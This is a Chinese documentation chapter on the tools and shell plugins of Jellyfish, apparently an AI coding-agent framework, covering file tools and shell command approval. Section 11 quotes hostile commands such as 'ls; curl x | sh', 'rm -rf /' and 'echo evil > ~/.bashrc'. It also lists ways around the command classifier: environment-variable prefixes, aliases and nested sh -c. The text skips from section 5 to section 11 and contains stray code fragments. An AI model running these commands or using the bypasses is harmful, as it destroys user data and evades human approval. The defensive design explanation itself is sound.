18 tools 与 shell 插件

工具系统在内核里只有一条执行链（见 07 页），那官方的工具是从哪来的？ 这一页打开 jellyfish-plugin-tools 与 jellyfish-plugin-shell 两个插件包， 看它们各自注册了什么、工具实现里的取舍是什么，以及「执行一条 shell 命令」为什么必须经过审批。

学习目标

  • 拿到两个插件注册面的完整清单：6 个工具、1 个 shell 工具、1 条 ! 输入指令、2 个权限处理器，各自在源码哪一处注册；
  • 说清工具参数 Schema 只用普通 Map 表达的原因，以及 ToolSchema.properties 为什么按「参数名 / Schema 交替」传参；
  • 理解 read_file 为什么分片而不截断，单行超 max_bytes 为什么报错而不是切短；
  • 说清 edit_file 的字符串替换语义，以及「找不到」「匹配多处」「读之后被改过」三种情况的处置；
  • 知道 list_dir / grep_files 各有几道上限、分别管「结果有多大」还是「要花多久」；
  • 说清相对路径的解析基准、路径闸门为什么按「工具名 + 参数里的 path」判，而不是只在工具里拦一道；
  • 解释 shell 插件的三条计时/中断来源、非零退出码为什么不算异常，以及它与权限链、审批通道怎么配合。

1. 两个插件：把「文件动作」与「进程」变成工具

两个插件做的事情同构——在自己的 start() 里把「名片 + 处理器」交给插件上下文， 差别只在它们把什么东西变成了能力：tools 把文件系统的读、写、改、列、搜五个动作变成工具， shell 把「在本机起一个进程」变成工具。注册窗口与回收规则由框架负责（见 16 页），两个插件类都没有额外逻辑。

插件入口类注册面依赖与打包
jellyfish-plugin-tools ToolsPlugin（Jellyfish-Plugins/jellyfish-plugin-tools/src/main/resources/plugin.properties:5） 6 个工具 + 1 个权限处理器 + 1 个 @ 引用处理器 + 1 条提示词贡献 只依赖 jellyfish-api、slf4j-api，都是 provided；无 shade
jellyfish-plugin-shell ShellPlugin（Jellyfish-Plugins/jellyfish-plugin-shell/src/main/resources/plugin.properties:5） 1 个工具 + 1 个权限处理器 + 1 条 ! 输入指令 多一个 commons-exec（compile），经 shade 打进插件包

依赖这一列不是细节。内核契约与日志库都必须写成 provided，理由写在 pom.xml 的注释里：PF4J 的插件类加载器是子优先的，插件包里若自带一份 zcd.jellyfish.api，它会遮蔽父加载器上的同名类、破坏类型同一性，内核的 PluginClasspathGuard 会在加载期直接拒绝这种插件包 （Jellyfish-Plugins/jellyfish-plugin-tools/pom.xml:19-27、 Jellyfish-Plugins/jellyfish-plugin-shell/pom.xml:36-41）。 commons-exec 不在父加载器上、插件也看不到 Maven 依赖树，因此必须 shade， 而 shade 只 include 了 org.apache.commons:commons-exec （Jellyfish-Plugins/jellyfish-plugin-shell/pom.xml:85-87）。

设计依据：依赖放哪一层，只看「父加载器上有没有一份」

内核已经有 slf4j-api，插件再打一份就是两份日志门面，所以写 provided； 内核没有 commons-exec，所以必须 shade。tools 的实现只用到 JDK 与内核契约， 没有需要带的第三方库，因此它的 pom.xml 里连 shade 插件都不需要—— 这是「插件只依赖 API」这条约定最干净的一个样本。

2. tools 插件：注册面与工具清单

整个插件类只有 71 行，核心是两段：一份静态工具清单，以及把它们连同策略一起注册进上下文。 清单里只有五个文件工具：

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ToolsPlugin.java:39-45（五个文件工具，顺序即注册顺序）
    /** 本插件提供的文件工具，顺序即注册顺序，无副作用。 */
    private static final List<PluginTool> TOOLS = Collections.unmodifiableList(Arrays.<PluginTool>asList(
            new ReadFileTool(),
            new WriteFileTool(),
            new EditFileTool(),
            new ListDirTool(),
            new GrepFilesTool()));

第六个工具 ask_user 进不了这份清单：它需要一条「把问题摆到用户面前并把答复带回来」的出向边， 而那条边只能从上下文取得。这就是注册分两段的原因，也是本页要数的第一个数字—— tools 插件一共注册了 6 个工具。

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ToolsPlugin.java:47-70（start()：五个工具、一个提问工具、一道路径闸门、一条 @ 引用与它的提示词约定）
    @Override
    public void start(PluginContext context) {
        for (PluginTool tool : TOOLS) {
            // 名字即路由键，工具名全局唯一这一点由 handle 的同键唯一语义保证
            tool.register(context);
        }
        // 提问工具进不了上面那份静态清单：它需要一条出向边（把问题摆到用户面前并把答复带回来），
        // 而那条边只能从上下文取得。它是本插件里唯一持有外部依赖的工具
        new AskUserTool(context.askUser()).register(context);
        // 路径闸门：读/写文件的工具在允许目录之外时要审批或拒绝。
        // 映射从工具实例上现取（工具自己声明访问性质），因此这里没有第二份需要同步维护的清单
        Map<String, PathAccess> accessByTool = new LinkedHashMap<String, PathAccess>();
        for (PluginTool tool : TOOLS) {
            accessByTool.put(tool.name(), tool.pathAccess());
        }
        context.contribute(PermissionCheckRequest.class,
                new PathGuardContribution(PathPolicy.from(context), accessByTool));
        // 输入框的行内引用：@ 只做补全，真正的读取仍由模型走 read_file，因此没有绕过权限面
        context.handle(InputReferenceRequest.class, FileReferenceCompletion.MARKER,
                new InputReferenceDescriptor("引用工作目录下的文件（补全路径）"),
                new FileReferenceCompletion());
        // 约定必须让模型知道，否则 @a.txt 在它眼里只是一段普通文字
        context.contribute(PromptContributionRequest.class, new FileReferencePromptContribution());
    }

三处值得停一下：① 注册顺序没有语义——工具靠名字路由，不靠位置； ② 闸门的映射是从工具实例上现取的（tool.name() → tool.pathAccess()）， 而不是另写一张「哪些工具碰路径」的表，少一张表就少一处会跟实现漂移的地方； ③ @ 只做补全——它注册在输入框行内引用上，返回候选路径，真正的读取仍由模型调用 read_file，因此既不绕过权限面，也不会把文件内容直接塞进上下文。相关约定（含「路径里的空白以反斜杠转义」） 由 Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/FileReferencePromptContribution.java:37 起的这段文本交给模型，并以 PromptPlacement.STATIC 贡献——它是常量，连会话之间都不变，最适合被反复复用。

        return PathAccess.NONE;
    }

「名片里的名字即路由键」这条约定被收进了一个默认方法，因此每个工具只需要实现 descriptor() 与 handle()：

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/PluginTool.java:60-62（注册动作本身）

        return context.handle(ToolCallRequest.class, name(), descriptor(), this);

这一句同时做了两件事：把名片与处理器一起落表，并用 name() 当路由键。 收进一个方法的意义在于——不存在「改了名片忘了改路由键」这种状态。

3. 工具参数 Schema 怎么描述

内核只要求 ToolDescriptor.parameters 是 JSON Schema 的 properties 部分， type: object 与 required 由内核在转成厂商请求时自己包上（见 07 页）。 既然只是一张「参数名 → 一段带类型的描述」的映射，tools 插件就刻意不引入任何 JSON 库， 用一百多行的 ToolSchema 把话说完。每个参数的描述只有两个键：

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ToolSchema.java:123-128（type + description，没有别的关键词）
    private static Map<String, Object> typed(String type, String description) {
        Map<String, Object> schema = new LinkedHashMap<String, Object>();
        schema.put(TYPE, type);
        schema.put("description", description);
        return schema;
    }

组装 properties 的方式值得单独讲：它不用 Map，而是用「参数名 / Schema 交替」的可变参数。

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ToolSchema.java:101-114（交替参数：调用点读起来就是声明顺序）
    static Map<String, Object> properties(Object... namesAndSchemas) {
        if (namesAndSchemas.length % 2 != 0) {
            throw new JellyfishException("工具参数 Schema 必须成对给出：参数名 + 描述");
        }
        Map<String, Object> properties = new LinkedHashMap<String, Object>();
        for (int i = 0; i < namesAndSchemas.length; i += 2) {
            Object name = namesAndSchemas[i];
            if (!(name instanceof String)) {
                throw new JellyfishException("工具参数名必须是字符串: " + name);
            }
            properties.put((String) name, namesAndSchemas[i + 1]);
        }
        return properties;
    }
设计依据：把「参数名与描述成对」交给一道运行期检查

用 Map 传参时参数是具名的，但调用点会变成「先建 Map、再一行一个 put」， 读的人要来回跳。交替参数让调用点本身就是一份声明清单 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:61-65 就是范例），代价是丢掉编译器对这层的检查，于是补上一条「个数必须为偶数」的运行期检查。 两个失败模式各有各的文案：奇数个参数是编码错误、参数名不是字符串是调用错误， 分开报比合并成一句更好查。

各工具的 Schema 就完全交给这套构造器了。read_file 的名片能一眼读完，也顺带回答 「必填参数怎么声明」——required 只列 path，其余三个都有回退值。

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:58-66（四个参数、只有 path 必填）
    private static final ToolDescriptor DESCRIPTOR = new ToolDescriptor(
            "read_file",
            "读取文本文件内容。大文件可用 offset 与 limit 分片读取，避免一次读入过多内容。",
            ToolSchema.properties(
                    "path", ToolSchema.string("文件路径，相对路径按进程工作目录解析"),
                    "offset", ToolSchema.integer("起始行号，从 1 开始；缺省从第一行开始"),
                    "limit", ToolSchema.integer("最多读取多少行；缺省读到文件末尾"),
                    "max_bytes", ToolSchema.integer("最多读取多少字节，缺省 " + DEFAULT_MAX_BYTES)),
            Arrays.asList("path"));

注意 DEFAULT_MAX_BYTES 被拼进了描述文本 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:47， 值是 64 * 1024），所以模型看到的缺省值不会与代码里的常量分叉。 ToolSchema 一个都不生成 minimum、enum、pattern 这类关键词—— 参数合法性的判断在工具里（ToolArguments），多写一份就多一处会不一致的约束。

4. read_file：分片而不是截断

真正的纪律在「读到多少就交多少」。read_file 有两个上限：行数（limit）与字节数 （max_bytes），而它们触发时的处置完全不同——行数到顶就停下并给续读提示， 单行本身就超过字节预算则直接报错。

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:157-172（两层上限：行数到顶停下，单行超预算报错）
                if (limit > 0 && taken >= limit) {
                    // 这一行已经读出来了，说明后面确实还有内容
                    moreContent = true;
                    break;
                }
                long lineBytes = utf8Length(line) + (taken > 0 ? 1 : 0);
                if (usedBytes + lineBytes > maxBytes) {
                    if (taken == 0) {
                        // 首行本身就超过预算：这不是「分页装不下」，而是这一行根本放不进来。
                        // 切短会输出一行看似完整、实际残缺的内容，因此报错并给出三条出路
                        throw new JellyfishException("单行超过 max_bytes（" + utf8Length(line) + " 字节 > "
                                + maxBytes + "）：请缩小 limit、调大 max_bytes，或改用 grep_files 定位该行");
                    }
                    moreContent = true;
                    break;
                }
设计依据：截断与分页是两件事

「超预算」有两种成因，处置也必须不同。多行超预算时内容仍在文件里， 可以按 offset 续读——所以停下、如实说「后面还有」，并给出下一条 offset （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:274 是那条续读提示）；单行超预算时那一行根本放不进来，切短会输出一行「看起来完整、 实际残缺」的内容，而模型无从判断自己拿到的是不是全文——所以报错，并把三条出路（缩小 limit、 调大 max_bytes、改用 grep_files）一起写进文案。

还有两处同源的取舍：非 UTF-8 文件在第一个非法字节处停下并说明原因，而不是把非法字节换成替换字符—— 换成替换字符的话，用户看到的「一堆问号」会被当成文件内容，而真相是编码不对；取消时把已经读到的部分 照常交出去并注明它是残缺的。两条都遵循同一条约定：停下时必须说清是哪一种停， 否则模型会把「读到这里为止」当成「文件就到这里」 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:128-203 这一段就是这两个分支）。

坑点：以为 max_bytes 是「不再截断」的那道闸

现象：给 read_file 传一个很大的 max_bytes， 输出仍然被截断，还多了一个落盘文件。
根因：这是两道路径。工具自己的 max_bytes 只是工具级的默认安全带 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/ReadFileTool.java:46-47）， 它让绝大多数调用不必惊动内核；内核那层还会再兜一次底，输出超过预算时落盘、只回灌头尾预览 （见 07 页）。两道都省不掉：工具不管，内核的落盘会被频繁触发； 内核不管，某个工具忘了限流就会把上下文撑爆。
规避：读大文件用 offset / limit 分片， 不要指望把 max_bytes 调大就能「一次读完」——落盘信封给的是预览与回查路径，不是全文。

5. edit_file / write_file：匹配校验与原子替换

两个写工具分工明确：write_file 是「这个文件现在应该是这样」， edit_file 是「把这一段换成那一段」。后者的核心是一个字符串查找，但替换之前要过三道判断。

Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/EditFileTool.java:66-88（匹配计数、读后校验、原子替换）
        Stamp before = Stamp.of(file);
        String content = readText(file);
        int matches = countMatches(content, oldText);
        if (matches == 0) {
            throw new JellyfishException("文件中未找到 old_text 匹配内容，请确认原文（缩进与换行必须完全一致）: "
                    + ToolPaths.display(file));
        }
        if (matches > 1 && !replaceAll) {
            throw new JellyfishException("old_text 在文件中匹配到 " + matches
                    + " 处，请补足上下文使其唯一，或设置 replace_all=true 全部替换");
        }
        String replaced = replaceAll ? content.replace(oldText, newText) : replaceOnce(content, oldText, newText);
        // 读之后、写之前再看一眼：这两步之间文件可能被别人（另一个代理、用户自己的编辑器）改过，
        // 而我们是整份覆盖——不查就会把他的改动静默抹掉

        if (!Files.isWritable(file)) {
            // 原子替换只受目录权限约束，会绕过文件自身的只读位——那与「不可写就别写」的直觉相反，
            // 因此这里显式挡一道，保持与普通写入一致的语义
            throw new JellyfishException("文件不可写: " + ToolPaths.display(file));
        }
        try {
            // 原子替换：写到一半失败时留下的仍是原来那份完整内容，而不是半截文件
            Utf8Files.writeAtomic(file, replaced.getBytes(StandardCharsets.UTF_8));

三种「不替换」的情况，各自解决一个具体的失败模式：

  • 找不到（matches == 0）：模型写的「原文」与文件里的实际文本不一致， 常见成因是缩进或换行不同——错误文案把这两个成因直接点名。这条判断在替换之前， 因此不会留下写了一半的文件。
  • 匹配多处且没声明 replace_all（matches > 1）： 模型写的原文常常是文件里很常见的一小段（一个变量名、一句 import），直接替换会把不相关的地方一起改掉。 这里拒绝执行，要求补足上下文使匹配唯一——这条错误信息比一次错误改写便宜得多。
  • 读之后文件被别人改过（requireUnchanged）：edit_file 是 「整份读出、整份写回」，读与写之间若有人改过这个文件，整份覆盖会把那些改动静默抹掉。 判据是文件的「身份」——大小 + 修改时间 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/EditFileTool.java:174 是取身份的那个方法），取这两样而不是重读一遍内容，因为重读要再付一次 IO。

替换本身用字面量匹配而不是正则：被改的是代码，里面的 .、(、 $ 全是普通字符；一旦按正则解释，模型必须自己转义，错一次就改坏文件。匹配计数也刻意不重叠计数 （Jellyfish-Plugins/jellyfish-plugin-tools/src/main/java/zcd/jellyfish/plugin/tools/EditFileTool.java:211）， 否则 aa 在 aaa 里会被算成两处。写回时用的是同目录临时文件 + 原子移动：

坑点：对非 UTF-8 文件做「改一处」

                // 报「实际静默了多久」而不是耗时：一条先跑了 1.4 秒才安静下来的命令，
                // 用耗时说「连续 N 秒无输出」会把有输出的那一段也算进去——那个数字不真
                text.append("连续 ").append(seconds(idleMillis)).append(" 秒无输出，判定为卡住并终止");
                break;

注意 IDLE_TIMEOUT 报的是实际静默时长而不是总耗时，因此 ShellResult 里单独留了 idleMillis 字段 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellResult.java:53-60）， 而它只能由等待循环那个判定点算出来——这就是为什么「结论」被单独做成了一个值对象 Verdict （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellProcessRunner.java:253-260）。 最后，"已取消" 与 "插件已停止" 分开说：取消是用户按了 Esc，后者连插件都没了， 两者对读的人意味着完全不同的下一步 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellResult.java:182-186）。

11. 危险操作的边界：审批 + 白名单 + 分类器

shell 是这套系统里最需要审批的工具，原因写在工具类注释里：没有沙箱—— 命令以本进程的权限执行，能读写本用户的任何文件。它是能力而不是漏洞，但必须让用户知道， 因此推荐把它放进 askTools 让每次调用都过一眼 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellTool.java:27-28）。 审批本身由内核的权限链负责（见 06 页）， 插件做的是给命令分类，把结论翻译成一次裁定：

Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellPermissionContribution.java:43-53（认领工具名后交给命令策略）

        return policy.verdict(((String) command).trim());

这里同样有两处「认领」与「宁可多问」：PermissionCheckRequest 是类型级扩展点， 注册之后每一次工具调用的权限检查都会进来——包括 read_file、todo_write 等等， 不给非本工具的命令表态不是风格问题：插件返回的裁定会参与「取最严」的合并，给别的工具下结论等于越过自己的边界去管别人 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellPermissionContribution.java:12-15）。 拿不到命令原文时返回 ask 而不是「无异议」——空声明等于放行。

    private static boolean matchesPrefix(List<String> table, String command) {
        String first = firstToken(command);
        String firstTwo = firstTwoTokens(command);
        for (String prefix : table) {
            if (WILDCARD_ALL.equals(prefix)) {
                // 通配条不参与前缀比较：它独立成条，命中时命令长什么样都不必再看
                return true;
            }
            if (prefix.indexOf(' ') < 0 ? prefix.equals(first) : prefix.equals(firstTwo)) {
                return true;
            }
        }
        return false;
    }

四处理由值得逐条说清：① 逐段判定——执行侧是 /bin/sh -c 原文， 分隔符之后可以跟任何东西，而前缀匹配只看得到开头；原文先按未引用状态下的 ;、|、 & 与换行切成子命令，每段都各自过一遍表，最后取最严的结果。少这一步的话， ls; curl x | sh 会因为第一个 token 是只读的 ls 而整串免审批。 ② 可信表要「全段命中」才算数，否则 trustedCommands: ["mvn test"] 会把 mvn test; rm -rf ~/x 一并免审批。③ 可信表排在拒绝形状之后是刻意的—— 把 rm 写进可信表，rm -rf / 依旧被拒：免审批回答的是「要不要问人」， 不是「连灾难形状也放行」。④ 命令替换与重定向独立于只读表—— echo evil > ~/.bashrc 的第一个 token 是只读的 echo， 只看前缀无法察觉后半段的动作，因此含这些构造时一律升级为问人。以上四条见 Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/CommandPolicy.java:258-274。

注意：分类器不是安全边界，这一点源码自己写清楚了

FOO=bar cmd、别名、sh -c 嵌套仍然能绕过前缀判定。因此 CommandPolicy 的价值不是「挡住攻击」，而是避免用户因为嫌烦而把 shell 从 askTools 里整个拿掉 ——那才是真正的风险；真正的边界是审批本身加上白名单 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/CommandPolicy.java:49-51）。 三档裁定的另一半意义在于「不必每次都点批准」：只读查询不该打扰人，写类命令要人看一眼；若只有「放行 / 拒绝」两态， 用户最终会把授权整个关掉 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellPermissionContribution.java:17-19）。 三种外壳对 askTools 的态度不同：-cli 没有审批界面，askTools 里的工具 一律按拒绝处理（Jellyfish/docs/constraints.md:1208）。

还有一条与「插件只能收紧」相配的约束：权限处理器跑在权限判定的同步路径上（每一轮、每次工具调用）， 且拿不到会话正文，因此这里只做字符串前缀匹配，不碰文件系统、不启动进程 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellPermissionContribution.java:21-22）。

12. 坑点清单

12.1 服务端外壳里的 shell，与 ServerCommandGate 不是一回事

现象：以为 -server 模式里有人把关，于是把 shell 留在 askTools 之外，结果 HTTP 调用链可以直接执行命令。
根因：内核确实给命令端点装了一道闸门，但它拒绝的是「在按 id 寻址的服务化外壳里 没有意义、或会改进程级状态」的那七条命令——new、resume、reload、 session、sessions、delete、rm （Jellyfish/jellyfish-server/src/main/java/zcd/jellyfish/server/handler/ServerCommandGate.java:42-43， 判定在 Jellyfish/jellyfish-server/src/main/java/zcd/jellyfish/server/handler/ServerCommandGate.java:57-67）。 它是「外壳寻址方式」的兼容性闸门，不是「危险动作」的闸门；名单是常量、不开放配置， 因为它是语义不兼容而不是可调策略。
规避：管危险动作的仍然是 askTools / deniedTools / allowedCommands 这套；服务模式下没有审批界面，因此要按「无人值守」来配—— 要么把 shell 放进 deniedTools，要么把允许的命令收进 allowedCommands 白名单 （不想一条条维护就写整条 *，两张表都可以；含义见上一节）。

12.2 输出落盘保护的是磁盘，不是 CPU

现象：命令输出几百 MB，系统没有崩、也没把内存吃光，但机器 CPU 被那条命令占满， 一直跑到超时。
根因：内核的捕获通道管的是「输出进不进内存/磁盘」（落盘与头尾预览，见 07 页），它不限制子进程本身干什么。yes 之类的命令会一直产出， ShellOutputCapture 继续 drain（必须继续，否则子进程会因管道写满而卡住），计数在涨， 而 CPU 已经是那条命令的了。
规避：靠时间兜底，不靠输出量——timeoutSeconds（缺省 120 秒） 与 idleTimeoutSeconds（缺省 0，即关闭）就是为此存在的 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/PluginConfig.java:38-47）。 对可能长时间静默的命令（例如等一次构建）应显式设置静默超时，否则卡住时只能等墙钟超时。

12.3 cd 不跨调用保留

现象：先执行 cd src，下一次调用 ls 仍在原目录。
根因：每次调用都是一个新的 /bin/sh -c 进程，工作目录由 ShellTool 每轮单独解析 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellTool.java:112-123）。
规避：用 cd 目录 && 命令，或直接传 cwd 参数。 这句话已经写进工具名片，模型不需要额外的提示词就应当知道 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/ShellTool.java:51-52）。

12.4 Windows 未验证

现象：在 Windows 上运行 shell 工具，行为未定义。
根因：非 POSIX 平台被映射成 cmd.exe /c，但它没有在真机上跑过—— 源码注释明确写着「不要把它当成已支持」 （Jellyfish-Plugins/jellyfish-plugin-shell/src/main/java/zcd/jellyfish/plugin/shell/CommonsExecShellProcessLauncher.java:28-29）。
规避：把它当作 POSIX 专用能力；跨平台需求走 tools 的文件工具， 它们只依赖 JDK 的 java.nio.file，没有平台假设。

顺带说：这两个插件的测试怎么跑

tools 的单测不需要第三方库（它只依赖 JDK 与内核契约），而 shell 有一个真实的端到端测试 profile：shell-it，它只跑 **/*IT.java，因为那些用例会真的 fork 进程 （echo、sleep、exit），不进普通的 mvn test （Jellyfish-Plugins/jellyfish-plugin-shell/pom.xml:107-132）。 两个插件另有一组「插件加载链路」的端到端验证，靠 jellyfish-infra 的 test 作用域依赖提供 真实的 PF4J 管理器与注册表——这条依赖绝不可升为 compile （Jellyfish-Plugins/jellyfish-plugin-tools/pom.xml:55-61）。

关键结论

  1. tools 插件注册 6 个工具（read_file、write_file、 edit_file、list_dir、grep_files、ask_user）， 外加一道路径闸门、一条 @ 引用与它的提示词约定；shell 插件注册 1 个工具（shell）、一个权限处理器与一条 ! 输入指令。
  2. 工具参数 Schema 只用 type + description 两个键，用「参数名 / Schema 交替」 的可变参数组装；不引入 JSON 库，也不生成 minimum 这类关键词——合法性判断归工具自己。
  3. 文件工具的纪律是如实说明「为什么停下」：行数到顶就分页并给续读偏移，单行超预算则报错， 非 UTF-8 在首个非法字节处停下，取消时交出已读部分并注明残缺。
  4. edit_file 用字面量匹配、替换前先数匹配数（0 处报错、多处要求唯一或显式 replace_all）、写前再校验文件身份，写回走临时文件 + 原子移动；write_file 是整份覆盖，因此必须区分「新建」与「覆盖」。
  5. 路径的三件事分属三层：解析与展示在工具（同一处口径），拦截在权限层（PathPolicy 只收紧、 按真实位置比较、缺省只管写），两者必须共用同一套解析规则，否则闸门会被绕过。
  6. shell 的三条计时/中断来源共用一个判定点，非零退出码是信息不是异常，被杀的进程不报退出码； 执行链把输出交给内核的 ToolOutputSink，因此落盘、命名与信封格式只有一份实现。
  7. 命令策略（白名单 + 可信表 + 分类器）只回答「能不能跑」与「要不要问人」，它不是安全边界； 真正的边界是审批与白名单，因此 shell 最该做的事是待在 askTools 里。
  8. 三张表共用同一套匹配：单 token（覆盖该命令的全部子命令）、两 token 精确前缀，以及整条 * ——后者是「匹配全部命令」的唯一写法，含义随表而定；git * 这类半个通配按字面量匹配、永不命中， 解析时会发告警（不替用户猜意图，因为猜错的方向都是放宽权限）。
